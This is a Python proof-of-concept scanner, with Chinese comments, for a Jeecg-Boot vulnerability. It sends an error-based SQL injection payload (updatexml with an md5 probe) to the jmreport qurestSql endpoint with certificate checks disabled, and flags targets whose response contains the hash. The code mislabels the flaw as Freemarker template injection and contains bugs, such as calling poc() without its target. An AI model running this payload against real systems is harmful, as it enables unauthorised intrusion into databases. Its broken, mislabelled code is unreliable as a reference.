
#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
  _______                   _       _         _       _           _   _             
 |__   __|                 | |     | |       (_)     (_)         | | (_)            
    | | ___ _ __ ___  _ __ | | __ _| |_ ___   _ _ __  _  ___  ___| |_ _  ___  _ __  
    | |/ _ \ '_ ` _ \| '_ \| |/ _` | __/ _ \ | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
    | |  __/ | | | | | |_) | | (_| | ||  __/ | | | | | |  __/ (__| |_| | (_) | | | |
    |_|\___|_| |_| |_| .__/|_|\__,_|\__\___| |_|_| |_| |\___|\___|\__|_|\___/|_| |_|
                     | |                            _/ |                            
                     |_|                           |__/                             


"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='Jeecg-Boot Freemarker 模版注入漏洞')
    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
    args = parser.parse_args()
    if args.url:
        poc()
    else:
        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
    


#poc函数
def poc(target):
    payload =' /jeecg-boot/jmreport/qurestSql '
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2088.112 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '/',
        'Connection': 'close',
        'Content-Type': 'application/json;charset=UTF-8',
        'Content-Length': '129'
    }
    data = {"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    if res.status_code == 200 and '49ba59abbe56e057' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main__':
    main()
